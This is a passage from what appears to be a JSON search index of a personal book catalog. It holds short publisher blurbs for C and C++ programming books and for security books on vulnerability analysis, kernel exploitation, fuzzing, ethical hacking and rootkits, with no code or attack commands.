57.2.4\u3000\u8c03\u8bd5\u5668\u64cd\u4f5c\u88ab\u8c03\u8bd5\u8005\u7684\u4ee3\u7801 649 57.2.5\u3000\u8c03\u8bd5\u5668\u5904\u7406\u88ab\u8c03\u8bd5\u8fdb\u7a0b\u4e2d\u53d1\u751f\u7684\u5f02\u5e38 649 57.3\u3000\u8c03\u8bd5\u7ec3\u4e60\uff1aDebugMe4.exe 650 57.4\u3000\u7b2c\u4e00\u6b21\u8c03\u8bd5 650 57.4.1\u3000\u9009\u5b9a\u8c03\u8bd5\u7684\u8d77\u59cb\u4f4d\u7f6e 650 57.4.2\u3000main() 650 57.5\u3000\u7b2c\u4e8c\u6b21\u8c03\u8bd5 651 57.6\u3000\u7b2c\u4e09\u6b21\u8c03\u8bd5 653 57.7\u3000\u7b2c\u56db\u6b21\u8c03\u8bd5 656 57.8\u3000\u7b2c\u4e94\u6b21\u8c03\u8bd5 658 57.8.1\u3000\u7cfb\u7edf\u65ad\u70b9 658 57.8.2\u3000EXCEPTION_ILLEGAL_INSTRUCTION(1) 659 57.8.3\u3000EXCEPTION_ILLEGAL_INSTRUCTION(2) 660 57.9\u3000\u7b2c\u516d\u6b21\u8c03\u8bd5 661 57.9.1\u300040121D\uff08\u7b2c\u4e00\u4e2a\u5f02\u5e38\uff09 661 57.9.2\u3000401299\uff08\u7b2c\u4e8c\u4e2a\u5f02\u5e38\uff09 665 57.10\u3000\u7b2c\u4e03\u6b21\u8c03\u8bd5 667 57.10.1\u3000\u9759\u6001\u65b9\u6cd5 668 57.10.2\u3000\u52a8\u6001\u65b9\u6cd5 669 57.11\u3000\u5c0f\u7ed3 673 \u7ed3\u675f\u8bed 674 \u7d22\u5f15 676","title":"\u76ee\u5f55"},{"location":"Book/Programming/C/C%20Primer%20Plus/","text":"C Primer Plus (Developer's Library) by Stephen Prata (Author) Introduction C Primer Plus is a carefully tested, well-crafted, and complete tutorial on a subject core to programmers and developers. This computer science classic teaches principles of programming, including structured code and top-down design. Author and educator Stephen Prata has created an introduction to C that is instructive, clear, and insightful. Fundamental programming concepts are explained along with details of the C language. Many short, practical examples illustrate just one or two concepts at a time, encouraging readers to master new topics by immediately putting them to use. Review questions and programming exercises at the end of each chapter bring out the most critical pieces of information and help readers understand and digest the most difficult concepts. A friendly and easy-to-use self-study guide, this book is appropriate for serious students of programming, as well as developers proficient in other languages with a desire to better understand the fundamentals of this core language. The sixth edition of this book has been updated and expanded to cover the latest developments in C as well as to take a detailed look at the new C11 standard. In C Primer Plus you\u2019ll find depth, breadth, and a variety of teaching techniques and tools to enhance your learning: Complete, integrated discussion of both C language fundamentals and additional features Clear guidance about when and why to use different parts of the language Hands-on learning with concise and simple examples that develop your understanding of a concept or two at a time Hundreds of practical sample programs Review questions and programming exercises at the end of each chapter to test your understanding Coverage of generic C to give you the greatest flexibility Cover","title":"C Primer Plus (Developer's Library)"},{"location":"Book/Programming/C/C%20Primer%20Plus/#c-primer-plus-developers-library","text":"by Stephen Prata (Author)","title":"C Primer Plus (Developer's Library)"},{"location":"Book/Programming/C/C%20Primer%20Plus/#introduction","text":"C Primer Plus is a carefully tested, well-crafted, and complete tutorial on a subject core to programmers and developers. This computer science classic teaches principles of programming, including structured code and top-down design. Author and educator Stephen Prata has created an introduction to C that is instructive, clear, and insightful. Fundamental programming concepts are explained along with details of the C language. Many short, practical examples illustrate just one or two concepts at a time, encouraging readers to master new topics by immediately putting them to use. Review questions and programming exercises at the end of each chapter bring out the most critical pieces of information and help readers understand and digest the most difficult concepts. A friendly and easy-to-use self-study guide, this book is appropriate for serious students of programming, as well as developers proficient in other languages with a desire to better understand the fundamentals of this core language. The sixth edition of this book has been updated and expanded to cover the latest developments in C as well as to take a detailed look at the new C11 standard. In C Primer Plus you\u2019ll find depth, breadth, and a variety of teaching techniques and tools to enhance your learning: Complete, integrated discussion of both C language fundamentals and additional features Clear guidance about when and why to use different parts of the language Hands-on learning with concise and simple examples that develop your understanding of a concept or two at a time Hundreds of practical sample programs Review questions and programming exercises at the end of each chapter to test your understanding Coverage of generic C to give you the greatest flexibility","title":"Introduction"},{"location":"Book/Programming/C/C%20Primer%20Plus/#cover","text":"","title":"Cover"},{"location":"Book/Programming/C/C%20Programming%20Language/","text":"C Programming Language, 2nd Edition by Brian W. Kernighan (Author), Dennis M. Ritchie (Author) Introduction The authors present the complete guide to ANSI standard C language programming. Written by the developers of C, this new version helps readers keep up with the finalized ANSI standard for C while showing how to take advantage of C's rich set of operators, economy of expression, improved control flow, and data structures. The 2/E has been completely rewritten with additional examples and problem sets to clarify the implementation of difficult language constructs. For years, C programmers have let K&R guide them to building well-structured and efficient programs. Now this same help is available to those working with ANSI compilers. Includes detailed coverage of the C language plus the official C language reference manual for at-a-glance help with syntax notation, declarations, ANSI changes, scope rules, and the list goes on and on. Cover","title":"C Programming Language, 2nd Edition"},{"location":"Book/Programming/C/C%20Programming%20Language/#c-programming-language-2nd-edition","text":"by Brian W. Kernighan (Author), Dennis M. Ritchie (Author)","title":"C Programming Language, 2nd Edition"},{"location":"Book/Programming/C/C%20Programming%20Language/#introduction","text":"The authors present the complete guide to ANSI standard C language programming. Written by the developers of C, this new version helps readers keep up with the finalized ANSI standard for C while showing how to take advantage of C's rich set of operators, economy of expression, improved control flow, and data structures. The 2/E has been completely rewritten with additional examples and problem sets to clarify the implementation of difficult language constructs. For years, C programmers have let K&R guide them to building well-structured and efficient programs. Now this same help is available to those working with ANSI compilers. Includes detailed coverage of the C language plus the official C language reference manual for at-a-glance help with syntax notation, declarations, ANSI changes, scope rules, and the list goes on and on.","title":"Introduction"},{"location":"Book/Programming/C/C%20Programming%20Language/#cover","text":"","title":"Cover"},{"location":"Book/Programming/C/C%20Traps%20and%20Pitfalls/","text":"C Traps and Pitfalls by Andrew Koenig (Author) Introduction Even C experts come across problems that require days of debugging to fix. This book helps to prevent such problems by showing how C programmers get themselves into trouble. Each of the book's many examples has trapped a professional programmer. Cover","title":"C Traps and Pitfalls"},{"location":"Book/Programming/C/C%20Traps%20and%20Pitfalls/#c-traps-and-pitfalls","text":"by Andrew Koenig (Author)","title":"C Traps and Pitfalls"},{"location":"Book/Programming/C/C%20Traps%20and%20Pitfalls/#introduction","text":"Even C experts come across problems that require days of debugging to fix. This book helps to prevent such problems by showing how C programmers get themselves into trouble. Each of the book's many examples has trapped a professional programmer.","title":"Introduction"},{"location":"Book/Programming/C/C%20Traps%20and%20Pitfalls/#cover","text":"","title":"Cover"},{"location":"Book/Programming/C/Expert%20C%20Programming%20Deep%20C%20Secrets/","text":"Expert C Programming: Deep C Secrets by Peter van der Linden (Author) Introduction This book is for the knowledgeable C programmer, this is a second book that gives the C programmers advanced tips and tricks. This book will help the C programmer reach new heights as a professional. Organized to make it easy for the reader to scan to sections that are relevant to their immediate needs. Cover","title":"Expert C Programming: Deep C Secrets"},{"location":"Book/Programming/C/Expert%20C%20Programming%20Deep%20C%20Secrets/#expert-c-programming-deep-c-secrets","text":"by Peter van der Linden (Author)","title":"Expert C Programming: Deep C Secrets"},{"location":"Book/Programming/C/Expert%20C%20Programming%20Deep%20C%20Secrets/#introduction","text":"This book is for the knowledgeable C programmer, this is a second book that gives the C programmers advanced tips and tricks. This book will help the C programmer reach new heights as a professional. Organized to make it easy for the reader to scan to sections that are relevant to their immediate needs.","title":"Introduction"},{"location":"Book/Programming/C/Expert%20C%20Programming%20Deep%20C%20Secrets/#cover","text":"","title":"Cover"},{"location":"Book/Programming/C/Pointers%20on%20C/","text":"Pointers on C by Kenneth Reek (Author) Introduction Designed for professionals and advanced students, Pointers On C provides a comprehensive resource for those needing in-depth coverage of the C programming language. An extensive explanation of pointer basics and a thorough exploration of their advanced features allows programmers to incorporate the power of pointers into their C programs. Complete coverage, detailed explanations of C programming idioms, and thorough discussion of advanced topics makes Pointers On C a valuable tutorial and reference for students and professionals alike. Cover","title":"Pointers on C"},{"location":"Book/Programming/C/Pointers%20on%20C/#pointers-on-c","text":"by Kenneth Reek (Author)","title":"Pointers on C"},{"location":"Book/Programming/C/Pointers%20on%20C/#introduction","text":"Designed for professionals and advanced students, Pointers On C provides a comprehensive resource for those needing in-depth coverage of the C programming language. An extensive explanation of pointer basics and a thorough exploration of their advanced features allows programmers to incorporate the power of pointers into their C programs. Complete coverage, detailed explanations of C programming idioms, and thorough discussion of advanced topics makes Pointers On C a valuable tutorial and reference for students and professionals alike.","title":"Introduction"},{"location":"Book/Programming/C/Pointers%20on%20C/#cover","text":"","title":"Cover"},{"location":"Book/Programming/C%2B%2B/C%2B%2B%20Primer%20Plus/","text":"C++ Primer Plus by Stephen Prata (Author) Introduction C++ Primer Plus, Sixth Edition New C++11 Coverage C++ Primer Plus is a carefully crafted, complete tutorial on one of the most significant and widely used programming languages today. An accessible and easy-to-use self-study guide, this book is appropriate for both serious students of programming as well as developers already proficient in other languages. The sixth edition of C++ Primer Plus has been updated and expanded to cover the latest developments in C++, including a detailed look at the new C++11 standard. Author and educator Stephen Prata has created an introduction to C++ that is instructive, clear, and insightful. Fundamental programming concepts are explained along with details of the C++ language. Many short, practical examples illustrate just one or two concepts at a time, encouraging readers to master new topics by immediately putting them to use. Review questions and programming exercises at the end of each chapter help readers zero in on the most critical information and digest the most difficult concepts. In C++ Primer Plu s, you\u2019ll find depth, breadth, and a variety of teaching techniques and tools to enhance your learning: A new detailed chapter on the changes and additional capabilities introduced in the C++11 standard Complete, integrated discussion of both basic C language and additional C++ features Clear guidance about when and why to use a feature Hands-on learning with concise and simple examples that develop your understanding a concept or two at a time Hundreds of practical sample programs Review questions and programming exercises at the end of each chapter to test your understanding Coverage of generic C++ gives you the greatest possible flexibility Teaches the ISO standard, including discussions of templates, the Standard Template Library, the string class, exceptions, RTTI, and namespaces Table of Contents 1: Getting Started with C++ 2: Setting Out to C++ 3: Dealing with Data 4: Compound Types 5: Loops and Relational Expressions 6: Branching Statements and Logical Operators 7: Functions: C++\u2019s Programming Modules 8: Adventures in Functions 9: Memory Models and Namespaces 10: Objects and Classes 11: Working with Classes 12: Classes and Dynamic Memory Allocation 13: Class Inheritance 14: Reusing Code in C++ 15: Friends, Exceptions, and More 16: The string Class and the Standard Template Library 17: Input, Output, and Files 18: The New C++11 Standard A Number Bases B C++ Reserved Words C The ASCII Character Set D Operator Precedence E Other Operators F The stringTemplate Class G The Standard Template Library Methods and Functions H Selected Readings and Internet Resources I Converting to ISO Standard C++ J Answers to Chapter Reviews Cover","title":"C++ Primer Plus"},{"location":"Book/Programming/C%2B%2B/C%2B%2B%20Primer%20Plus/#c-primer-plus","text":"by Stephen Prata (Author)","title":"C++ Primer Plus"},{"location":"Book/Programming/C%2B%2B/C%2B%2B%20Primer%20Plus/#introduction","text":"C++ Primer Plus, Sixth Edition New C++11 Coverage C++ Primer Plus is a carefully crafted, complete tutorial on one of the most significant and widely used programming languages today. An accessible and easy-to-use self-study guide, this book is appropriate for both serious students of programming as well as developers already proficient in other languages. The sixth edition of C++ Primer Plus has been updated and expanded to cover the latest developments in C++, including a detailed look at the new C++11 standard. Author and educator Stephen Prata has created an introduction to C++ that is instructive, clear, and insightful. Fundamental programming concepts are explained along with details of the C++ language. Many short, practical examples illustrate just one or two concepts at a time, encouraging readers to master new topics by immediately putting them to use. Review questions and programming exercises at the end of each chapter help readers zero in on the most critical information and digest the most difficult concepts. In C++ Primer Plu s, you\u2019ll find depth, breadth, and a variety of teaching techniques and tools to enhance your learning: A new detailed chapter on the changes and additional capabilities introduced in the C++11 standard Complete, integrated discussion of both basic C language and additional C++ features Clear guidance about when and why to use a feature Hands-on learning with concise and simple examples that develop your understanding a concept or two at a time Hundreds of practical sample programs Review questions and programming exercises at the end of each chapter to test your understanding Coverage of generic C++ gives you the greatest possible flexibility Teaches the ISO standard, including discussions of templates, the Standard Template Library, the string class, exceptions, RTTI, and namespaces Table of Contents 1: Getting Started with C++ 2: Setting Out to C++ 3: Dealing with Data 4: Compound Types 5: Loops and Relational Expressions 6: Branching Statements and Logical Operators 7: Functions: C++\u2019s Programming Modules 8: Adventures in Functions 9: Memory Models and Namespaces 10: Objects and Classes 11: Working with Classes 12: Classes and Dynamic Memory Allocation 13: Class Inheritance 14: Reusing Code in C++ 15: Friends, Exceptions, and More 16: The string Class and the Standard Template Library 17: Input, Output, and Files 18: The New C++11 Standard A Number Bases B C++ Reserved Words C The ASCII Character Set D Operator Precedence E Other Operators F The stringTemplate Class G The Standard Template Library Methods and Functions H Selected Readings and Internet Resources I Converting to ISO Standard C++ J Answers to Chapter Reviews","title":"Introduction"},{"location":"Book/Programming/C%2B%2B/C%2B%2B%20Primer%20Plus/#cover","text":"","title":"Cover"},{"location":"Book/Programming/C%2B%2B/C%2B%2B%20Primer/","text":"C++ Primer by Stanley Lippman (Author), Jos\u00e9e Lajoie (Author), Barbara Moo (Author) Introduction Bestselling Programming Tutorial and Reference Completely Rewritten for the New C11 Standard Fully updated and recast for the newly released C11 standard this authoritative and comprehensive introduction to C will help you to learn the language fast and to use it in modern highly effective ways Highlighting todays best practices the authors show how to use both the core language and its standard library to write efficient readable and powerful code C Primer Fifth Edition introduces the C standard library from the outset drawing on its common functions and facilities to help you write useful programs without first having to master every language detail The books many examples have been revised to use the new language features and demonstrate how to make the best use of them This book is a proven tutorial for those new to C an authoritative discussion of core C concepts and techniques and a valuable resource for experienced programmers especially those eager to see C11 enhancements illuminated Start Fast and Achieve MoreLearn how to use the new C11 language features and the standard library to build robust programs quickly and get comfortable with high-level programming Learn through examples that illuminate todays best coding styles and program design techniques Understand the rationale behind the rules why C11 works as it does Use the extensive crossreferences to help you connect related concepts and insights Benefit from up-to-date learning aids and exercises that emphasize key points help you to avoid pitfalls promote good practices and reinforce what youve learned Access the source code for the extended examples from informit comtitle0321714113 C Primer Fifth Edition features an enhanced layflat binding which allows the book to stay open more easily when placed on a flat surface This special binding method-notable by a small space inside the spine-also increases durability Cover","title":"C++ Primer"},{"location":"Book/Programming/C%2B%2B/C%2B%2B%20Primer/#c-primer","text":"by Stanley Lippman (Author), Jos\u00e9e Lajoie (Author), Barbara Moo (Author)","title":"C++ Primer"},{"location":"Book/Programming/C%2B%2B/C%2B%2B%20Primer/#introduction","text":"Bestselling Programming Tutorial and Reference Completely Rewritten for the New C11 Standard Fully updated and recast for the newly released C11 standard this authoritative and comprehensive introduction to C will help you to learn the language fast and to use it in modern highly effective ways Highlighting todays best practices the authors show how to use both the core language and its standard library to write efficient readable and powerful code C Primer Fifth Edition introduces the C standard library from the outset drawing on its common functions and facilities to help you write useful programs without first having to master every language detail The books many examples have been revised to use the new language features and demonstrate how to make the best use of them This book is a proven tutorial for those new to C an authoritative discussion of core C concepts and techniques and a valuable resource for experienced programmers especially those eager to see C11 enhancements illuminated Start Fast and Achieve MoreLearn how to use the new C11 language features and the standard library to build robust programs quickly and get comfortable with high-level programming Learn through examples that illuminate todays best coding styles and program design techniques Understand the rationale behind the rules why C11 works as it does Use the extensive crossreferences to help you connect related concepts and insights Benefit from up-to-date learning aids and exercises that emphasize key points help you to avoid pitfalls promote good practices and reinforce what youve learned Access the source code for the extended examples from informit comtitle0321714113 C Primer Fifth Edition features an enhanced layflat binding which allows the book to stay open more easily when placed on a flat surface This special binding method-notable by a small space inside the spine-also increases durability","title":"Introduction"},{"location":"Book/Programming/C%2B%2B/C%2B%2B%20Primer/#cover","text":"","title":"Cover"},{"location":"Book/Security/0day%E5%AE%89%E5%85%A8/","text":"0day\u5b89\u5168\uff1a\u8f6f\u4ef6\u6f0f\u6d1e\u5206\u6790\u6280\u672f Author: \u738b\u6e05 Introduction \u738b\u6e05\u4e3b\u7f16\u7684\u300aOday\u5b89\u5168\uff1a\u8f6f\u4ef6\u6f0f\u6d1e\u5206\u6790\u6280\u672f\uff08\u7b2c2\u7248\uff09\u300b\u5206\u4e3a5\u7bc733\u7ae0\uff0c\u7cfb\u7edf\u3001\u5168\u9762\u5730\u4ecb\u7ecd\u4e86Windows\u5e73\u53f0\u7f13\u51b2\u533a\u6ea2\u51fa\u6f0f\u6d1e\u7684\u5206\u6790\u3001\u68c0\u6d4b\u4e0e\u9632\u62a4\u3002\u7b2c\u4e00\u7bc7\u4e3a\u6f0f\u6d1eexploit\u7684\u57fa\u7840\u7406\u8bba\u548c\u521d\u7ea7\u6280\u672f\uff0c\u53ef\u4ee5\u5f15\u9886\u8bfb\u8005\u8fc5\u901f\u5165\u95e8\uff1b\u7b2c\u4e8c\u7bc7\u5728\u7b2c\u4e00\u7bc7\u7684\u57fa\u7840\u4e0a\uff0c\u7ed3\u5408\u56fd\u5185\u5916\u76f8\u5173\u7814\u7a76\u8005\u7684\u524d\u6cbf\u6210\u679c\uff0c\u5bf9\u6f0f\u6d1e\u6280\u672f\u4ece\u653b\u3001\u9632\u4e24\u4e2a\u65b9\u9762\u8fdb\u884c\u603b\u7ed3\uff1b\u7b2c\u4e09\u7bc7\u7ad9\u5728\u5b89\u5168\u6d4b\u8bd5\u8005\u7684\u89d2\u5ea6\uff0c\u8ba8\u8bba\u4e86\u51e0\u7c7b\u5e38\u7528\u8f6f\u4ef6\u7684\u6f0f\u6d1e\u6316\u6398\u65b9\u6cd5\u4e0e\u601d\u8def\uff1b\u7b2c\u56db\u7bc7\u5219\u586b\u8865\u4e86\u672c\u7c7b\u4e66\u7c4d\u5728Windows\u5185\u6838\u5b89\u5168\u53ca\u76f8\u5173\u653b\u9632\u77e5\u8bc6\u8fd9\u4e2a\u795e\u79d8\u9886\u57df\u7684\u6280\u672f\u7a7a\u767d\uff1b\u7b2c\u4e94\u7bc7\u4ee5\u5927\u91cf\u7684Oday\u6848\u4f8b\u5206\u6790\uff0c\u6765\u5e2e\u52a9\u8bfb\u8005\u7406\u89e3\u524d\u56db\u7bc7\u7684\u5404\u7c7b\u601d\u60f3\u65b9\u6cd5\u3002 \u300aOday\u5b89\u5168\uff1a\u8f6f\u4ef6\u6f0f\u6d1e\u5206\u6790\u6280\u672f\uff08\u7b2c2\u7248\uff09\u300b\u53ef\u4f5c\u4e3a\u7f51\u7edc\u5b89\u5168\u4ece\u4e1a\u4eba\u5458\u3001\u9ed1\u5ba2\u6280\u672f\u53d1\u70e7\u53cb\u7684\u53c2\u8003\u6307\u5357\uff0c\u4e5f\u53ef\u4f5c\u4e3a\u7f51\u7edc\u5b89\u5168\u4e13\u4e1a\u7684\u7814\u7a76\u751f\u6216\u672c\u79d1\u751f\u7684\u6307\u5bfc\u7528\u4e66\u3002 Cover","title":"0day\u5b89\u5168\uff1a\u8f6f\u4ef6\u6f0f\u6d1e\u5206\u6790\u6280\u672f"},{"location":"Book/Security/0day%E5%AE%89%E5%85%A8/#0day","text":"Author: \u738b\u6e05","title":"0day\u5b89\u5168\uff1a\u8f6f\u4ef6\u6f0f\u6d1e\u5206\u6790\u6280\u672f"},{"location":"Book/Security/0day%E5%AE%89%E5%85%A8/#introduction","text":"\u738b\u6e05\u4e3b\u7f16\u7684\u300aOday\u5b89\u5168\uff1a\u8f6f\u4ef6\u6f0f\u6d1e\u5206\u6790\u6280\u672f\uff08\u7b2c2\u7248\uff09\u300b\u5206\u4e3a5\u7bc733\u7ae0\uff0c\u7cfb\u7edf\u3001\u5168\u9762\u5730\u4ecb\u7ecd\u4e86Windows\u5e73\u53f0\u7f13\u51b2\u533a\u6ea2\u51fa\u6f0f\u6d1e\u7684\u5206\u6790\u3001\u68c0\u6d4b\u4e0e\u9632\u62a4\u3002\u7b2c\u4e00\u7bc7\u4e3a\u6f0f\u6d1eexploit\u7684\u57fa\u7840\u7406\u8bba\u548c\u521d\u7ea7\u6280\u672f\uff0c\u53ef\u4ee5\u5f15\u9886\u8bfb\u8005\u8fc5\u901f\u5165\u95e8\uff1b\u7b2c\u4e8c\u7bc7\u5728\u7b2c\u4e00\u7bc7\u7684\u57fa\u7840\u4e0a\uff0c\u7ed3\u5408\u56fd\u5185\u5916\u76f8\u5173\u7814\u7a76\u8005\u7684\u524d\u6cbf\u6210\u679c\uff0c\u5bf9\u6f0f\u6d1e\u6280\u672f\u4ece\u653b\u3001\u9632\u4e24\u4e2a\u65b9\u9762\u8fdb\u884c\u603b\u7ed3\uff1b\u7b2c\u4e09\u7bc7\u7ad9\u5728\u5b89\u5168\u6d4b\u8bd5\u8005\u7684\u89d2\u5ea6\uff0c\u8ba8\u8bba\u4e86\u51e0\u7c7b\u5e38\u7528\u8f6f\u4ef6\u7684\u6f0f\u6d1e\u6316\u6398\u65b9\u6cd5\u4e0e\u601d\u8def\uff1b\u7b2c\u56db\u7bc7\u5219\u586b\u8865\u4e86\u672c\u7c7b\u4e66\u7c4d\u5728Windows\u5185\u6838\u5b89\u5168\u53ca\u76f8\u5173\u653b\u9632\u77e5\u8bc6\u8fd9\u4e2a\u795e\u79d8\u9886\u57df\u7684\u6280\u672f\u7a7a\u767d\uff1b\u7b2c\u4e94\u7bc7\u4ee5\u5927\u91cf\u7684Oday\u6848\u4f8b\u5206\u6790\uff0c\u6765\u5e2e\u52a9\u8bfb\u8005\u7406\u89e3\u524d\u56db\u7bc7\u7684\u5404\u7c7b\u601d\u60f3\u65b9\u6cd5\u3002 \u300aOday\u5b89\u5168\uff1a\u8f6f\u4ef6\u6f0f\u6d1e\u5206\u6790\u6280\u672f\uff08\u7b2c2\u7248\uff09\u300b\u53ef\u4f5c\u4e3a\u7f51\u7edc\u5b89\u5168\u4ece\u4e1a\u4eba\u5458\u3001\u9ed1\u5ba2\u6280\u672f\u53d1\u70e7\u53cb\u7684\u53c2\u8003\u6307\u5357\uff0c\u4e5f\u53ef\u4f5c\u4e3a\u7f51\u7edc\u5b89\u5168\u4e13\u4e1a\u7684\u7814\u7a76\u751f\u6216\u672c\u79d1\u751f\u7684\u6307\u5bfc\u7528\u4e66\u3002","title":"Introduction"},{"location":"Book/Security/0day%E5%AE%89%E5%85%A8/#cover","text":"","title":"Cover"},{"location":"Book/Security/A%20Guide%20to%20Kernel%20Exploitation/","text":"A Guide to Kernel Exploitation: Attacking the Core Author: Enrico Perla B.Sc. Computer Science University of Torino M.Sc. Computer Science Trinity College Dublin (Author), Massimiliano Oldani (Author) Introduction A Guide to Kernel Exploitation: Attacking the Core discusses the theoretical techniques and approaches needed to develop reliable and effective kernel-level exploits, and applies them to different operating systems, namely, UNIX derivatives, Mac OS X, and Windows. Concepts and tactics are presented categorically so that even when a specifically detailed vulnerability has been patched, the foundational information provided will help hackers in writing a newer, better attack; or help pen testers, auditors, and the like develop a more concrete design and defensive structure. The book is organized into four parts. Part I introduces the kernel and sets out the theoretical basis on which to build the rest of the book. Part II focuses on different operating systems and describes exploits for them that target various bug classes. Part III on remote kernel exploitation analyzes the effects of the remote scenario and presents new techniques to target remote issues. It includes a step-by-step analysis of the development of a reliable, one-shot, remote exploit for a real vulnerability a bug affecting the SCTP subsystem found in the Linux kernel. Finally, Part IV wraps up the analysis on kernel exploitation and looks at what the future may hold. Cover","title":"A Guide to Kernel Exploitation: Attacking the Core"},{"location":"Book/Security/A%20Guide%20to%20Kernel%20Exploitation/#a-guide-to-kernel-exploitation-attacking-the-core","text":"Author: Enrico Perla B.Sc. Computer Science University of Torino M.Sc. Computer Science Trinity College Dublin (Author), Massimiliano Oldani (Author)","title":"A Guide to Kernel Exploitation: Attacking the Core"},{"location":"Book/Security/A%20Guide%20to%20Kernel%20Exploitation/#introduction","text":"A Guide to Kernel Exploitation: Attacking the Core discusses the theoretical techniques and approaches needed to develop reliable and effective kernel-level exploits, and applies them to different operating systems, namely, UNIX derivatives, Mac OS X, and Windows. Concepts and tactics are presented categorically so that even when a specifically detailed vulnerability has been patched, the foundational information provided will help hackers in writing a newer, better attack; or help pen testers, auditors, and the like develop a more concrete design and defensive structure. The book is organized into four parts. Part I introduces the kernel and sets out the theoretical basis on which to build the rest of the book. Part II focuses on different operating systems and describes exploits for them that target various bug classes. Part III on remote kernel exploitation analyzes the effects of the remote scenario and presents new techniques to target remote issues. It includes a step-by-step analysis of the development of a reliable, one-shot, remote exploit for a real vulnerability a bug affecting the SCTP subsystem found in the Linux kernel. Finally, Part IV wraps up the analysis on kernel exploitation and looks at what the future may hold.","title":"Introduction"},{"location":"Book/Security/A%20Guide%20to%20Kernel%20Exploitation/#cover","text":"","title":"Cover"},{"location":"Book/Security/Fuzzing%20for%20Software%20Security%20Testing%20and%20Quality%20Assurance/","text":"Fuzzing for Software Security Testing and Quality Assurance (Artech House Information Security and Privacy) Author: Ari Takanen (Author), Jared D. Demott (Contributor), Charles Miller (Contributor) Introduction Learn the code cracker's malicious mindset, so you can find worn-size holes in the software you are designing, testing, and building. Fuzzing for Software Security Testing and Quality Assurance takes a weapon from the black-hat arsenal to give you a powerful new tool to build secure, high-quality software. This practical resource helps you add extra protection without adding expense or time to already tight schedules and budgets. The book shows you how to make fuzzing a standard practice that integrates seamlessly with all development activities. This comprehensive reference goes through each phase of software development and points out where testing and auditing can tighten security. It surveys all popular commercial fuzzing tools and explains how to select the right one for a software development project. The book also identifies those cases where commercial tools fall short and when there is a need for building your own fuzzing tools. Cover","title":"Fuzzing for Software Security Testing and Quality Assurance (Artech House Information Security and Privacy)"},{"location":"Book/Security/Fuzzing%20for%20Software%20Security%20Testing%20and%20Quality%20Assurance/#fuzzing-for-software-security-testing-and-quality-assurance-artech-house-information-security-and-privacy","text":"Author: Ari Takanen (Author), Jared D. Demott (Contributor), Charles Miller (Contributor)","title":"Fuzzing for Software Security Testing and Quality Assurance (Artech House Information Security and Privacy)"},{"location":"Book/Security/Fuzzing%20for%20Software%20Security%20Testing%20and%20Quality%20Assurance/#introduction","text":"Learn the code cracker's malicious mindset, so you can find worn-size holes in the software you are designing, testing, and building. Fuzzing for Software Security Testing and Quality Assurance takes a weapon from the black-hat arsenal to give you a powerful new tool to build secure, high-quality software. This practical resource helps you add extra protection without adding expense or time to already tight schedules and budgets. The book shows you how to make fuzzing a standard practice that integrates seamlessly with all development activities. This comprehensive reference goes through each phase of software development and points out where testing and auditing can tighten security. It surveys all popular commercial fuzzing tools and explains how to select the right one for a software development project. The book also identifies those cases where commercial tools fall short and when there is a need for building your own fuzzing tools.","title":"Introduction"},{"location":"Book/Security/Fuzzing%20for%20Software%20Security%20Testing%20and%20Quality%20Assurance/#cover","text":"","title":"Cover"},{"location":"Book/Security/Gray%20Hat%20Hacking/","text":"Gray Hat Hacking The Ethical Hackers Handbook Author: Allen Harper (Author), Shon Harris (Author), Jonathan Ness (Author), Chris Eagle (Author), Gideon Lenkey (Author), Terron Williams (Author) Introduction THE LATEST STRATEGIES FOR UNCOVERING TODAY'S MOST DEVASTATING ATTACKS Thwart malicious network intrusion by using cutting-edge techniques for finding and fixing security flaws. Fully updated and expanded with nine new chapters, Gray Hat Hacking: The Ethical Hacker's Handbook, Third Edition details the most recent vulnerabilities and remedies along with legal disclosure methods. Learn from the experts how hackers target systems, defeat production schemes, write malicious code, and exploit flaws in Windows and Linux systems. Malware analysis, penetration testing, SCADA, VoIP, and Web security are also covered in this comprehensive resource. Develop and launch exploits using BackTrack and Metasploit Employ physical, social engineering, and insider attack techniques Build Perl, Python, and Ruby scripts that initiate stack buffer overflows Understand and prevent malicious content in Adobe, Office, and multimedia files Detect and block client-s Cover","title":"Gray Hat Hacking The Ethical Hackers Handbook"},{"location":"Book/Security/Gray%20Hat%20Hacking/#gray-hat-hacking-the-ethical-hackers-handbook","text":"Author: Allen Harper (Author), Shon Harris (Author), Jonathan Ness (Author), Chris Eagle (Author), Gideon Lenkey (Author), Terron Williams (Author)","title":"Gray Hat Hacking The Ethical Hackers Handbook"},{"location":"Book/Security/Gray%20Hat%20Hacking/#introduction","text":"THE LATEST STRATEGIES FOR UNCOVERING TODAY'S MOST DEVASTATING ATTACKS Thwart malicious network intrusion by using cutting-edge techniques for finding and fixing security flaws. Fully updated and expanded with nine new chapters, Gray Hat Hacking: The Ethical Hacker's Handbook, Third Edition details the most recent vulnerabilities and remedies along with legal disclosure methods. Learn from the experts how hackers target systems, defeat production schemes, write malicious code, and exploit flaws in Windows and Linux systems. Malware analysis, penetration testing, SCADA, VoIP, and Web security are also covered in this comprehensive resource. Develop and launch exploits using BackTrack and Metasploit Employ physical, social engineering, and insider attack techniques Build Perl, Python, and Ruby scripts that initiate stack buffer overflows Understand and prevent malicious content in Adobe, Office, and multimedia files Detect and block client-s","title":"Introduction"},{"location":"Book/Security/Gray%20Hat%20Hacking/#cover","text":"","title":"Cover"},{"location":"Book/Security/Rootkit/","text":"The Rootkit Arsenal: Escape and Evasion: Escape and Evasion in the Dark Corners of the System Author: Bill Blunden (Author) Introduction This book demonstrates how to modify a system at runtime to subvert a forensic live response. Readers will learn how to conceal their presence on a server, disable its security policies, sidestep group policy, maintain remote access, and covertly monitor system activity--all with the system administrator being none the wiser. Cover","title":"The Rootkit Arsenal: Escape and Evasion: Escape and Evasion in the Dark Corners of the System"},{"location":"Book/Security/Rootkit/#the-rootkit-arsenal-escape-and-evasion-escape-and-evasion-in-the-dark-corners-of-the-system","text":"Author: Bill Blunden (Author)","title":"The Rootkit Arsenal: Escape and Evasion: Escape and Evasion in the Dark Corners of the System"},{"location":"Book/Security/Rootkit/#introduction","text":"This book demonstrates how to modify a system at runtime to subvert a forensic live response. Readers will learn how to conceal their presence on a server, disable its security policies, sidestep group policy, maintain remote access, and covertly monitor system activity--all with the system administrator being none the wiser.","title":"Introduction"},{"location":"Book/Security/Rootkit/#cover","text":"","title":"Cover"},{"location":"Book/Security/%E6%BC%8F%E6%B4%9E%E6%88%98%E4%BA%89/","text":"\u6f0f\u6d1e\u6218\u4e89\uff1a\u8f6f\u4ef6\u6f0f\u6d1e\u5206\u6790\u7cbe\u8981 Author: \u6797\u6860\u6cc9 Introduction 